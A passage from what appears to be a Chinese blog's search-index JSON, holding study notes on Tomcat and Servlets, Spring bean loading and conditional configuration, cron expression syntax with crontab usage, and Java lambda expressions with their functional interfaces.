token。\n这个世界没那么多复杂需求。哪个合适用哪个。点名批评我自己关于墨夏的出入库系统的设计。\n","categories":["学习笔记"],"tags":["session","token","cookie","单点登录","JWT"]},{"title":"Tomcat执行流程与Servlet","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Tomcat%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E4%B8%8EServlet/","content":"Tomcat 简介Tomcat 服务器是一个免费的开放源代码的 Web 应用服务器。应用十分广泛，毕竟免费好用。\nTomcat 官网Tomcat 与 servlet、jsp、jdk 的版本支持\nTomcat 目录结构：\n\n\n\n目录\n说明\n\n\n\nbin\n命令中心（启动、关闭等命令）\n\n\nconf\n配置中心（核心配置 server.xml）\n\n\nlib\nTomcat 的库文件。Tomcat 运行时需要的 jar 包所在的目录。\n\n\nlogs\n存放日志文件。\n\n\ntemp\n存储临时产生的文件，即缓存。\n\n\nwebapps\n存放项目的文件，web 应用放置到此目录下浏览器可以直接访问。\n\n\nwork\n存放编译以后的 class 文件。\n\n\n下载 tomcat 压缩包后，解压并启动 tomcat便可以看见如下画面，即启动成功。\n部署应用，将 web 项目打包成 war 包，放在 webapps 目录下启动 tomcat 即可。\nTomcat 执行流程Tomcat 是 Http 服务器 + Servlet 容器。对我们屏蔽了应用层和网络层的协议（即不用我们去处理 TCP 连接，以及对 HTTP 报文的解析），给我们提供了标准的 Request 和 Response 对象。我们只需要从 request 中获取请求参数，然后调用业务逻辑，最后构建 Response 对象返回即可。至于 TCP 连接 和 HTTP 协议的数据处理和响应，Tomcat 会帮我们完成。实现了 HTTP 服务器与业务类的解耦。\n详细架构就不仔细介绍了，放几篇文章：\nTomcat 架构原理解析到架构设计借鉴四张图带你了解Tomcat系统架构Tomcat 的体系结构（超详细）\n介绍执行流程之前，先介绍几个概念（上面的文章中也有）：\n\nServer：服务器，启动一个 tomcat 就是启动了一个服务器，一个 Server 可以有多个 Service ，一个 Service 可以有多个 Connector 和 Engine\nService：服务，一个 server 可以包含多个 service 一个 service 维护多个 Connector 和一个 Engine\nEngine：叫引擎，也有资料叫 Container ，一个服务可以开一个引擎，就是一个公司可以有很多个门，不同身份的人从不同的门进，但是具体干活的就一个部门。引擎负责处理请求，不需要考虑请求链接，协议等。\nContext：一个 Context 管理一个应用，其实就是我们写的程序。\nWrapper：每个都封装着一个 Servlet（当然只局限于普通的 Http 请求）。\n\n下面是 Tomcat 的执行流程：比如用户发送一个请求： http://localhost:8080/test/index.jsp\n\n我们的请求被发送到本机端口8080，被在那里侦听的 Coyote HTTP&#x2F;1.1 Connector 获得。\nConnector 把该请求交给它所在的 Service 的 Engine 来处理，并等待来自 Engine 的回应 。\nEngine 获得请求 localhost:8080&#x2F;test&#x2F;index.jsp ，匹配它所拥有的所有虚拟主机 Host ，我们的虚拟主机在 server.xml 中默认配置的就是 localhost。\nEngine 匹配到 name&#x3D;localhost 的 Host（即使匹配不到也把请求交给该 Host 处理，因为该 Host 被定义为该 Engine 的默认主机）。\nlocalhost Host 获得请求 &#x2F;test&#x2F;index.jsp ，匹配它所拥有的所有 Context。\nHost 匹配到路径为 &#x2F;test 的 Context（如果匹配不到就把该请求交给路径名为””的Context去处理）。\npath&#x3D;”&#x2F;test” 的 Context 获得请求 &#x2F;index.jsp，在它的 mapping table 中寻找对应的 servlet 。\nContext 匹配到 URL PATTERN 为 *.jsp 的 servlet，对应于 JspServlet 类。\n构造 HttpServletRequest 对象和 HttpServletResponse 对象，作为参数调用 JspServlet 的 doGet 或 doPost 方法 。\nContext 把执行完了之后的 HttpServletResponse 对象返回给 Host 。\nHost 把 HttpServletResponse 对象返回给 Engine 。\nEngine 把 HttpServletResponse 对象返回给 Connector 。\nConnector 把 HttpServletResponse 对象返回给客户 browser 。\n\n所以我们在使用 tomcat 时，不需要理会中间过程（HTTP怎么解析，TCP怎么连接）。只需要写好 servlet 和 对应的映射关系即可。\nServlet 简介Servlet（Server Applet） 是基于 Jakarta 技术的 Web 组件，由容器管理，可生成动态内容。与其他基于 Jakarta 技术的组件一样，servlet 是独立于平台的 Java 类，它们被编译为与平台无关的字节码，这些字节码可以动态加载到支持 Jakarta 技术的 Web 服务器中并由其运行。容器，有时也称为 servlet 引擎，是提供 servlet 功能的 Web 服务器扩展。Servlet 通过 servlet 容器实现的请求&#x2F;响应范式与 Web 客户端交互。\nServlet 容器是 Web 服务器或应用程序服务器的一部分，它提供发送请求和响应的网络服务、解码基于 MIME 的请求以及格式化基于 MIME 的响应。Servlet 容器还通过其生命周期包含和管理 Servlet。Servlet 容器可以内置到主机 Web 服务器中，也可以通过该服务器的本机扩展 API 作为附加组件安装到 Web 服务器。Servlet 容器也可以内置于或可能安装在支持 Web 的应用程序服务器中。所有 Servlet 容器都必须支持 HTTP 作为请求和响应的协议，但可以支持其他基于请求&#x2F;响应的协议，例如 HTTPS（基于 SSL 的 HTTP）。容器必须实现的 HTTP 规范的必需版本是 HTTP&#x2F;1.1 和 HTTP&#x2F;2。Java SE 8 是必须用来构建 Servlet 容器的底层 Java 平台的最低版本。\n更多可以参考菜鸟教程-servlet教程\nServlet 生命周期Servlet 生命周期可被定义为从创建直到毁灭的整个过程。\n以下是 Servlet 遵循的过程：\n\nServlet 初始化后调用 init () 方法。\nServlet 调用 service() 方法来处理客户端的请求。\nServlet 销毁前调用 destroy() 方法。\n\n最后，Servlet 是由 JVM 的垃圾回收器进行垃圾回收的。\n\n首次访问 servlet 时，init() 方法会被执行，并且会执行 service() 方法再次访问时，只会执行 service() 方法关闭 web 容器时，会执行 destroy() 方法\n\nServlet 使用创建 servlet 有三种方式：\n\n实现 javax.servlet.Servlet 接口。\n继承 javax.servlet.GenericServlet 类。\n继承 javax.servlet.http.HttpServlet 类。\n\n一般使用第三种方式进行 servlet 的创建。创建完成后，需要在 web.xml 中完成 servlet 的配置（映射关系之类的）才可以使用。\n例如：servlet:\npublic class ServletTest extends HttpServlet &#123;    @Override    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;        PrintWriter printWriter = resp.getWriter();        printWriter.println(&quot;ServletTest&quot;);    &#125;    @Override    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;        doGet(req, resp);    &#125;&#125;\n\n别忘了在 web.xml 中添加映射:\n&lt;web-app&gt;    &lt;servlet&gt;        &lt;servlet-name&gt;ServletTest&lt;/servlet-name&gt;        &lt;servlet-class&gt;servletProject.servlet.ServletTest&lt;/servlet-class&gt;    &lt;/servlet&gt;    &lt;servlet-mapping&gt;        &lt;servlet-name&gt;ServletTest&lt;/servlet-name&gt;        &lt;url-pattern&gt;/ServletTest&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;&lt;/web-app&gt;\n\nservlet 中详细的方法用法可以参考菜鸟教程，有比较详细的文档。关于 web.xml 中 servlet 的匹配规则也不详细列举了。\n关于 JSPJSP 全称 Java Server Pages，是一种动态网页开发技术。它使用 JSP 标签在 HTML 网页中插入 Java 代码。标签通常以 &lt;% 开头以 %&gt; 结束。JSP 是一种 Java servlet，主要用于实现 Java web 应用程序的用户界面部分。网页开发者们通过结合 HTML 代码、XHTML 代码、XML 元素以及嵌入 JSP 操作和命令来编写 JSP。\n由于 jsp 以及被淘汰了，所以就放个教程的链接。后面的内容也只是做简单介绍，不做具体使用。菜鸟教程-jsp教程\n首先，来讲下 jsp 出现的原因：因为 tomcat 的出现，我们只需要写 servlet 就可以完成 web 请求。但是 servlet 主要功能在于交互式地浏览和生成数据，生成动态 Web 内容。而动态响应的内容是写在 servlet（java代码）中的，即我们需要在 Java 中使用字符串拼接 html 页面。这显然是很麻烦，并且低效，阅读性差的工作。所以 jsp 就诞生了，既能写 java 代码，又能写 html。\nJSP 的实现原理：JSP 的本质其实还是 servlet。因为浏览器向服务器发送请求，无论访问什么资源，其实都是在访问 servlet。服务器在执行 jsp 的时候，首先把 jsp 编译成一个 Java（servlet） 文件，然后将 Java 文件编译为 class 文件，加载到容器中。最后和其他的 servlet 一样，创建实例，初始化，调用 service() 方法，将 html 返回给客户端。\nJSP 的缺点（不好用的地方）：\n\n动态资源与静态资源耦合在一起，无法做到前后端分离。并且服务端压力也大，一旦服务器出现问题，整个网站前后端一起寄。\n前端做好网页后，需要后端改成 jsp 页面。沟通成本巨大、出错的概率也大、修改起来也麻烦（需要双方的协同开发）、效率因此也低。\nJSP 必须要在支持 Java 的容器（tomcat）中运行，而无法使用 nginx 等。nginx 的性能很高。\n第一次请求 jsp ，需要经过编译。速度较慢。\n\n所以后面才会发展出视图解析器以及 Thymeleaf 模板引擎 等技术来解决前端资源根据需求动态生成的问题。再往后就是前后端更加彻底的分离，vue+springboot 这种，可以将静态资源完全交由前端处理，后端仅实现数据接口的模式。\nEND说白了就是解耦，专业的人干专业的事。\n","categories":["学习笔记"],"tags":["tomcat","servlet","jsp"]},{"title":"bean的加载方式与加载控制","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/bean%E7%9A%84%E5%8A%A0%E8%BD%BD%E6%96%B9%E5%BC%8F%E4%B8%8E%E5%8A%A0%E8%BD%BD%E6%8E%A7%E5%88%B6/","content":"bean 加载方式XML 方式声明 bean&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;!--声明自定义 bean--&gt;    &lt;bean id=&quot;bookService&quot;          class=&quot;com.example.demo.service.impl.BookServiceImpl&quot;          scope=&quot;singleton&quot;/&gt;    &lt;!--声明第三方 bean--&gt;    &lt;bean id=&quot;dataSource&quot; class=&quot;com.alibaba.druid.pool.DruidDataSource&quot;/&gt;&lt;/beans&gt;\n\nXML 和 注解 声明 beanxml 配置很繁琐，所以提供了 注解 的声明方式。但依然要在 xml 文件中告诉 spring 需要扫描的包。即去哪里找到被注解声明的 bean\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans       http://www.springframework.org/schema/beans/spring-beans.xsd       http://www.springframework.org/schema/context       http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;    &lt;!--配置扫描的包，去扫描包中的加了注解需要声明 bean--&gt;    &lt;context:component-scan base-package=&quot;com.example.demo&quot;/&gt;&lt;/beans&gt;\n\n@Configurationpublic class DataSourceConfig&#123;    @Bean    public DruidDataSource getDataSource()&#123;        DruidDataSource dataSource = new DruidDataSource();        // 在这里做其余的配置，比如这个 bean 对象需要的属性（这里是数据源等信息） 等等..        return dataSource;    &#125;&#125;\n\n使用 @Component 及其衍生注解 @Controller、@Service、@Repository 定义 bean使用 @Bean 定义第三方 bean，并将其所在类定义为配置类或 bean。（一般使用 @Configuration 将其定义为配置类）\n注解方式声明配置类既然可以用注解声明 bean，那么配置信息也可以用注解声明。就可以彻底舍弃掉 xml 文件了。\n@ComponentScan(&#123;&quot;com.example.demo&quot;&#125;)public class SpringConfig&#123;    @Bean    public DruidDataSource getDataSource()&#123;        DruidDataSource dataSource = new DruidDataSource();        // 在这里做其余的配置，比如这个 bean 对象需要的属性（这里是数据源等信息） 等等..        // ...        return dataSource;    &#125;&#125;\n\n@Configuration 配置项如果不用于被扫描可以省略\n拓展1：FactoryBean初始化实现 FactoryBean 接口的类，可以实现对 bean 加载到容器之前的批处理操作。从名字可以看出是工厂模式\npublic class BookFactoryBean implements FactoryBean&lt;Book&gt; &#123;    @Override    public Book getObject() throws Exception &#123;        Book book = new Book();        // 各种相关的初始化操作        // ...        return book;    &#125;    // 获取 bean 的类型    @Override    public Class&lt;?&gt; getObjectType() &#123;        return Book.class;    &#125;    // 是否为单例模式（默认都为单例）    /*     多例模式即 每次向 spring 容器获取这个 bean 时，都会初始化(new)一个新的返回。    此时 spring 容器只管创建不管销毁。而单例模式，spring 掌握 bean 的整个生命周期     */    @Override    public boolean isSingleton() &#123;        return FactoryBean.super.isSingleton();    &#125;&#125;\n\n有了上面的实现 factorybean 接口之后的工厂类，再使用 @Bean 进行加载时。会调用 工厂类 的 getObject() 方法创建 bean\n@Configurationpublic class SpringConfig &#123;    @Bean    public BookFactoryBean book() &#123;        BookFactoryBean bookFactoryBean = new BookFactoryBean();        // 配置需要的参数等..        // ...        return bookFactoryBean;    &#125;&#125;\n\n拓展2：proxyBeanMethod 属性proxyBeanMethod 是 @Configuration 注解中的属性。默认值为 true这个属性决定了该配置类是否被代理。（spring 使用基于继承的 cglib 动态代理 和 基于接口的 jdk 动态代理 两种代理方式）\n为 true 时，配置类会被 cglib 代理增强。生成代理对象，放入 spring 容器。此时，bean 是单例的。@Bean 调用生成实例时，如果容器中已经存在这个 bean，就会直接返回。被称为 Full 模式\n为 false 时，每次获取 bean 都会生成新的 bean 对象。（多例被称为 Lite 模式\n@Import 加载 bean使用 @Import 注解导入需要注入的 bean 对应的字节码@Import 加载的 bean 名称为 全路径类名。比如 com.example.demo.Book导入 配置类，配置类及类里声明的 bean 都会被加载\n@Import(Book.class)public class SpringConfig&#123;&#125;\n\n被导入的 bean 无需注解声明\npublic class Book&#123;&#125;\n\n无侵入式编程降低了代码与 spring 的耦合。使用较多\n在上下文对象在容器中初始化完毕后手动注入 beanpublic class Main &#123;    public static void main(String[] args) &#123;        AnnotationConfigApplicationContext context = new AnnotationConfigApplicationContext(SpringConfig.class);        context.register(Book.class);        // 指定 bean 名称        context.registerBean(&quot;javaBook&quot;, Book.class);    &#125;&#125;\n\n@Import 导入 ImportSelector 接口，实现对导入源的编程式处理框架中会大量使用。\npublic class TestImportSelector implements ImportSelector &#123;    @Override    public String[] selectImports(AnnotationMetadata importingClassMetadata) &#123;        /*        方法参数 importingClassMetadata 为导入类的元数据        可以获取导入各种信息及状态，从而可以对 bean 的加载进行控制等操作         */        boolean b = importingClassMetadata.hasAnnotation(&quot;org.springframework.context.annotation.Configuration&quot;);        if (b)&#123;            return new String[]&#123;&quot;com.example.demo.Book&quot;&#125;;        &#125;        return new String[0];    &#125;&#125;\n\n@Import 导入 ImportBeanDefinitionRegistrar 接口，实现对导入源的编程式处理，及注册相对于 ImportSelector 的拓展，可以使用 BeanDefinitionRegistry 注册器控制 bean 的注册等。\npublic class TestRegister implements ImportBeanDefinitionRegistrar &#123;    @Override    public void registerBeanDefinitions(AnnotationMetadata importingClassMetadata, BeanDefinitionRegistry registry) &#123;        // 和 ImportSelector 一样，可以获得元数据进行控制        // ...        // 通过 BeanDefinition 的注册器注册实名 bean        AbstractBeanDefinition beanDefinition = BeanDefinitionBuilder.rootBeanDefinition(Book.class).getBeanDefinition();        registry.registerBeanDefinition(&quot;javaBook&quot;,beanDefinition);    &#125;&#125;\n\n@Import 导入 BeanDefinitionRegistryPostProcessor 接口，后置处理在 bean 定义注册器结束之后，执行 实现方法。最后对容器中的 bean 进行干预。\npublic class TestPostProcessor implements BeanDefinitionRegistryPostProcessor &#123;    @Override    public void postProcessBeanDefinitionRegistry(BeanDefinitionRegistry beanDefinitionRegistry) throws BeansException &#123;        // 和 ImportBeanDefinitionRegistrar 使用一样，不过最后执行。（bean 定义注册器完成后        AbstractBeanDefinition beanDefinition = BeanDefinitionBuilder.rootBeanDefinition(Book.class).getBeanDefinition();        beanDefinitionRegistry.registerBeanDefinition(&quot;javaBook&quot;,beanDefinition);    &#125;    @Override    public void postProcessBeanFactory(ConfigurableListableBeanFactory configurableListableBeanFactory) throws BeansException &#123;    &#125;&#125;\n\nbean 的加载控制编程式 控制 bean 加载上面 bean 的加载方式中，最后四种都可以在代码中对 bean 的加载加以控制。（加一些条件其他的则不行，写了便加载进去。无法加以条件的控制\n注解式 控制 bean 加载@Conditional 注解是 spring 提供的。可以帮助我们实现 bean 的加载控制。但他需要我们传一个 Condition 类型的参数。Condition 是一个接口，需要我们自己实现 matches 方法，实现规则以控制 bean 的加载。\nspringboot 提供了很多 Condition 的实现，大多以 ConditionalOn 开头，也有叫 Profile 的（区分加载环境等）。使用 @ConditionalOn*** 注解为 bean 的加载设置条件。\n比如下面的用法：在有 com.example.demo.Java 这个类的情况下，才加载 Book 这个 bean。\n@Configurationpublic class SpringConfig &#123;    @Bean    @ConditionalOnClass(name = &quot;com.example.demo.Java&quot;)    public Book getBook()&#123;        return new Book();    &#125;&#125;\n\n类似的还有 @ConditionalOnMissingClass、@ConditionalOnWebApplication、@ConditionalOnBean 等等注解，以实现不同的条件控制。\nbean 依赖属性的配置实现约定大于配置的一种方式吧。当配置属性时，使用配置文件中的属性。否则，使用默认值（即约定\n实现方式：\n基础类：\n@Datapublic class Cat &#123;    private String name;    private Integer age;&#125;\n\n@Datapublic class Mouse &#123;    private String name;    private Integer age;&#125;\n\n配置文件加载类：使用 @ConfigurationProperties(prefix &#x3D; “cartoon”) 加载配置文件中 cartoon 开头的属性\n@Data@ConfigurationProperties(prefix = &quot;cartoon&quot;)public class CartoonProperties &#123;    private Cat cat;    private Mouse mouse;&#125;\n\n依赖配置文件中属性的 bean：使用 @EnableConfigurationProperties(CartoonProperties.class) 让配置文件加载类（使用了 @ConfigurationProperties 注解的类）生效并将其注入到容器中，交由容器进行管理。如果不使用这个注解，则需要使用 @Component 手动注入。\n@Component@Data@EnableConfigurationProperties(CartoonProperties.class)public class CartoonCatAndMouse &#123;    private Cat cat;    private Mouse mouse;    private CartoonProperties cartoonProperties;    // 使用构造器注入，其他注入方式也可以    public CartoonCatAndMouse(CartoonProperties cartoonProperties) &#123;        this.cartoonProperties = cartoonProperties;        // 在无参构造中，进行一些条件的判断。以实现配置的内容生效，不配置使用默认值的效果        cat = new Cat();        cat.setName(cartoonProperties.getCat() != null &amp;&amp; StringUtils.hasText(cartoonProperties.getCat().getName()) ? cartoonProperties.getCat().getName() : &quot;tom&quot;);        cat.setAge(cartoonProperties.getCat() != null &amp;&amp; cartoonProperties.getCat().getAge() != null ? cartoonProperties.getCat().getAge() : 5);        mouse = new Mouse();        mouse.setName(cartoonProperties.getMouse() != null &amp;&amp; StringUtils.hasText(cartoonProperties.getMouse().getName()) ? cartoonProperties.getMouse().getName() : &quot;jerry&quot;);        mouse.setAge(cartoonProperties.getMouse() != null &amp;&amp; cartoonProperties.getMouse().getAge() != null ? cartoonProperties.getMouse().getAge() : 3);    &#125;    public void play() &#123;        System.out.println(cat.getAge() + &quot;岁的&quot; + cat.getName() + &quot;和&quot; + mouse.getAge() + &quot;岁的&quot; + mouse.getName() + &quot;打起来了&quot;);    &#125;&#125;\n\n配置文件中的内容：\ncartoon:  cat:    name: 图多盖洛    age: 3  mouse:    name: 泰菲    age: 1\n\nEND原理学习任重道远\n","categories":["学习笔记"],"tags":["java","spring"]},{"title":"cron表达式","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/cron%E8%A1%A8%E8%BE%BE%E5%BC%8F/","content":"简介cron 表达式是一个用于设置计划任务的字符串，其由几个字段组成，每个字段代表任务在相应时间、日期或时间间隔执行的规则。cron 表达式最初是在 类Unix 操作系统中使用的，而现在它已经被广泛地应用于各种操作系统和编程语言中。\ncron 表达式是一个字符串，以 5 或 6 个空格隔开，分为 6 或 7 个域，每一个域代表一个含义。\ncron 有如下两种语法格式：\n\n秒 分 小时 日期 月份 星期 年\n秒 分 小时 日期 月份 星期\n\n每个域允许的值\n\n\n域\n允许的值\n允许的特殊字符\n\n\n\n秒\n0-59\n, - * &#x2F;\n\n\n分\n0-59\n, - * &#x2F;\n\n\n小时\n0-23\n, - * &#x2F;\n\n\n日期\n1-31\n, - * ? &#x2F; L W C\n\n\n月份\n1-12\n, - * &#x2F; JAN-DEC\n\n\n星期\n1-7\n, - * ? &#x2F; L C # SUN-SAT\n\n\n年份（可选）\n留空，1970-2099\n, - * &#x2F;\n\n\n\n星期中，1表示星期日，2表示星期一，以此类推。月份中省略部分 JAN,FEB,MAR,APR,MAY,JUNE,JULY,AUG,SEP,OCT,NOW,DEC星期中省略部分 SUN,MON,TUE,WED,THU,FRI,SAT年份可选\n\n特殊字符含义\n\n\n字符\n含义\n示例\n\n\n\n*\n表示匹配域的任意值\n在分这个域使用 *，即表示每分钟都会触发事件。\n\n\n？\n表示匹配域的任意值，但只能用在日期和星期两个域，因为这两个域会相互影响。\n要在每月的 20 号触发调度，不管每个月的 20 号是星期几，则只能使用如下写法：13 13 15 20 * ?。其中，因为日期域已经指定了 20 号，最后一位星期域只能用 ?，不能使用 *。如果最后一位使用 *，则表示不管星期几都会触发，与日期域的 20 号相斥，此时表达式不正确。\n\n\n-\n表示起止范围\n在分这个域使用 5-20，表示从 5 分到 20 分钟每分钟触发一次。\n\n\n&#x2F;\n表示起始时间开始触发，然后每隔固定时间触发一次\n在分这个域使用 5&#x2F;20，表示在第 5 分钟触发一次，之后每 20 分钟触发一次，即 5、 25、45 等分别触发一次。\n\n\n,\n表示列出枚举值\n在分这个域使用 5,20，则意味着在 5 和 20 分每分钟触发一次。\n\n\nL\n表示最后，只能出现在日和星期两个域\n在星期这个域使用 5L，意味着在最后的一个星期四触发。\n\n\nW\n表示有效工作日（周一到周五），只能出现在日这个域，系统将在离指定日期最近的有效工作日触发事件。\n在日这个域使用 5W，如果 5 号是星期六，则将在最近的工作日星期五，即 4 号触发。如果 5 号是星期天，则在 6 号（周一）触发；如果 5 号为工作日，则就在 5 号触发。另外，W 的最近寻找不会跨过月份。\n\n\nLW\n这两个字符可以连用，表示在某个月最后一个工作日，即最后一个星期五。\n\n\n\n#\n表示每个月第几个星期几，只能出现在星期这个域\n在星期这个域使用 4#2，表示某月的第二个星期三，4 表示星期三，2 表示第二个。\n\n\n\nC 字符没太明白，放在下面字符“C”允许在日期域和星期域出现。这个字符依靠一个指定的“日历”。也就是说这个表达式的值依赖于相关的“日历”的计算结果，如果没有“日历”关联，则等价于所有包含的“日历”。如：日期域是“5C”表示关联“日历”中第一天，或者这个月开始的第一天的后5天。星期域是“1C”表示关联“日历”中第一天，或者星期的第一天的后1天，也就是周日的后一天（周一）。不同环境的 cron 表达式实现不一致，部分字符可能只在特定环境生效。\n\ncrontab 用法Linux crontab 是用来定期执行程序的命令。crond 命令每分钟会定期检查是否有要执行的工作，如果有要执行的工作便会自动执行该工作。\n\n新创建的 cron 任务，不会马上执行，至少要过 2 分钟后才可以，当然你可以重启 cron 来马上执行。\n\n语法 crontab [ -u user ] file 或 crontab [ -u user ] { -l | -r | -e }\n说明 crontab 是用来让使用者在固定时间或固定间隔执行程序之用，换句话说，也就是类似使用者的时程表。-u user 是指设定指定 user 的时程表，这个前提是你必须要有其权限(比如说是 root)才能够指定他人的时程表。如果不使用 -u user 的话，就是表示设定自己的时程表。\n参数\n\n-e : 执行文字编辑器来设定时程表，内定的文字编辑器是 VI，如果你想用别的文字编辑器，则请先设定 VISUAL 环境变数来指定使用那个文字编辑器(比如说 setenv VISUAL joe)\n-r : 删除目前的时程表\n-l : 列出目前的时程表\n\n示例（来自阿里文档）\n*&#x2F;5 * * * * ?    每隔 5 秒执行一次\n0 *&#x2F;1 * * * ?    每隔 1 分钟执行一次\n0 0 2 1 * ?    每月 1 日的凌晨 2 点执行一次\n0 15 10 ? * MON-FRI    周一到周五每天上午 10    15 执行作业\n0 15 10 ? 6L 2002-2006    2002 年至 2006 年的每个月的最后一个星期五上午 10:15 执行作业\n0 0 23 * * ?    每天 23 点执行一次\n0 0 1 * * ?    每天凌晨 1 点执行一次\n0 0 1 1 * ?    每月 1 日凌晨 1 点执行一次\n0 0 23 L * ?    每月最后一天 23 点执行一次\n0 0 1 ? * L    每周星期天凌晨 1 点执行一次\n0 26,29,33 * * * ?    在 26 分、29 分、33 分执行一次\n0 0 0,13,18,21 * * ?    每天的 0 点、13 点、18 点、21 点都执行一次\n0 0 10,14,16 * * ?    每天上午 10 点，下午 2 点，4 点执行一次\n0 0&#x2F;30 9-17 * * ?    朝九晚五工作时间内每半小时执行一次\n0 0 12 ? * WED    每个星期三中午 12 点执行一次\n0 0 12 * * ?    每天中午 12 点触发\n0 15 10 ? * *    每天上午 10:15 触发\n0 15 10 * * ?    每天上午 10:15 触发\n0 15 10 * * ? *    每天上午 10:15 触发\n0 15 10 * * ? 2005    2005 年的每天上午 10:15 触发\n0 * 14 * * ?    每天下午 2 点到 2:59 期间的每 1 分钟触发\n0 0&#x2F;5 14 * * ?    每天下午 2 点到 2:55 期间的每 5 分钟触发\n0 0&#x2F;5 14,18 * * ?    每天下午 2 点到 2:55 期间和下午 6 点到 6:55 期间的每 5 分钟触发\n0 0-5 14 * * ?    每天下午 2 点到 2:05 期间的每 1 分钟触发\n0 10,44 14 ? 3 WED    每年三月的星期三的下午 2:10 和 2:44 触发\n0 15 10 ? * MON-FRI    周一至周五的上午 10:15 触发\n0 15 10 15 * ?    每月 15 日上午 10:15 触发\n0 15 10 L * ?    每月最后一日的上午 10:15 触发\n0 15 10 ? * 6L    每月的最后一个星期五上午 10:15 触发\n0 15 10 ? * 6L 2002-2005    2002 年至 2005 年的每月的最后一个星期五上午 10:15 触发\n0 15 10 ? * 6#3    每月的第三个星期五上午 10:15 触发\n\n","categories":["学习笔记"],"tags":["定时任务","cron"]},{"title":"lambda表达式的使用","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E4%BD%BF%E7%94%A8/","content":"函数式编程在使用 lambda 之前，要先了解下函数式编程。函数式编程-wiki\n函数式编程，或称函数程序设计、泛函编程（英语：Functional programming），是一种编程范型，它将电脑运算视为函数运算，并且避免使用程序状态以及可变物件。它的特点就是，函数和其他变量一样，可以作为参数传递给其他函数，也可以作为其他函数的返回值。\n可以作为参数，意味着函数嵌套，数学里的高阶函数 f(g(x)) 这种。可以作为返回值，可以实现惰性计算。（在需要结果时才对其进行计算，避免不必要的运算，节约内存。\n简单写下吧，概念性的东西不是我所擅长的。重点就是 函数也可以作为变量\nlambda 表达式Lambda 是 JDK8 中一个语法糖。他可以对某些匿名内部类的写法进行简化。（但是不能完全替代匿名内部类的使用它是函数式编程思想的一个重要体现。让我们不用关注是什么对象。而是更关注我们对数据进行了什么操作。\n下面直接举例子，关于线程的创建\npublic class Main &#123;    public static void main(String[] args) &#123;        // 使用匿名内部类的方式        new Thread(new Runnable() &#123;            @Override            public void run() &#123;                System.out.println(Thread.currentThread().getName() + &quot; run&quot;);            &#125;        &#125;).start();        // 简化匿名内部类的方式        new Thread(() -&gt; &#123;            System.out.println(Thread.currentThread().getName() + &quot; run&quot;);        &#125;).start();                // lambda 表达式简化        new Thread(() -&gt; System.out.println(Thread.currentThread().getName() + &quot; run&quot;)).start();    &#125;&#125;\n\n使用 lambda 的情况：要求实现的接口是 函数式接口函数式接口可以被隐式转换为 lambda 表达式。那么什么是函数式接口？看看上面例子中 Runnable接口 的实现：\npackage java.lang;// 注释...@FunctionalInterfacepublic interface Runnable &#123;    // 注释...    public abstract void run();&#125;\n\n简单的：函数式接口(Functional Interface)就是一个有且仅有一个抽象方法，但是可以有多个非抽象方法的接口。\n具体的：函数式接口：\n\n有且仅有一个抽象方法。\n可以有 默认（default）方法，因为有默认实现，不是抽象的。\n接口默认继承java.lang.Object，所以如果接口显示声明覆盖了Object中方法，那么也不算抽象方法。\n@FunctionalInterface 不是必须的，如果一个接口符合”函数式接口”定义，那么加不加该注解都没有影响。加上该注解能够更好地让编译器进行检查。如果编写的不是函数式接口，但是加上了 @FunctionInterface，那么编译器会报错。\n\n所以 lambda 表达式主要是对这种函数式接口的简化。它的主要原则：可推导可省略\n因为知道传入参数的类型，所以 new 匿名内部类的步骤可以省略。因为这个接口只有一个抽象方法需要实现，所以方法名可以省略。只有一个方法，那么这个方法的参数类型和返回值类型也可以省略。\n最后简化的结果就是 (参数) -&gt; {方法体}都省这么多了，那就再省一点。当参数值有一个时，小括号也可以省略；当方法体只有一条语句时，大括号也可以省略。就变成了 一个参数 -&gt; 语句\njdk 实现java.util.function 它包含了很多类，用来支持 Java的 函数式编程。\n主要的四个类是：Function&lt;T, R&gt; 接受一个参数，返回一个结果。Consumer 接受一个参数，执行一些操作，无返回值。Supplier 不接受参数，生成一个值，并返回一个值。Predicate 接受一个参数，返回一个布尔值。\n其余基本是这四个的拓展。Bi前缀为接收两个参数，以及指定特定类型。不像这四个使用的都是泛型。\n下面是它们接口的源码，很简单。\npackage java.util.function;import java.util.Objects;/** * Represents a function that accepts one argument and produces a result. */@FunctionalInterfacepublic interface Function&lt;T, R&gt; &#123;    /**     * Applies this function to the given argument.     */    R apply(T t);    /**     * Returns a composed function that first applies the &#123;@code before&#125;     * function to its input, and then applies this function to the result.     * If evaluation of either function throws an exception, it is relayed to     * the caller of the composed function.     */    default &lt;V&gt; Function&lt;V, R&gt; compose(Function&lt;? super V, ? extends T&gt; before) &#123;        Objects.requireNonNull(before);        return (V v) -&gt; apply(before.apply(v));    &#125;    /**     * Returns a composed function that first applies this function to     * its input, and then applies the &#123;@code after&#125; function to the result.     * If evaluation of either function throws an exception, it is relayed to     * the caller of the composed function.     */    default &lt;V&gt; Function&lt;T, V&gt; andThen(Function&lt;? super R, 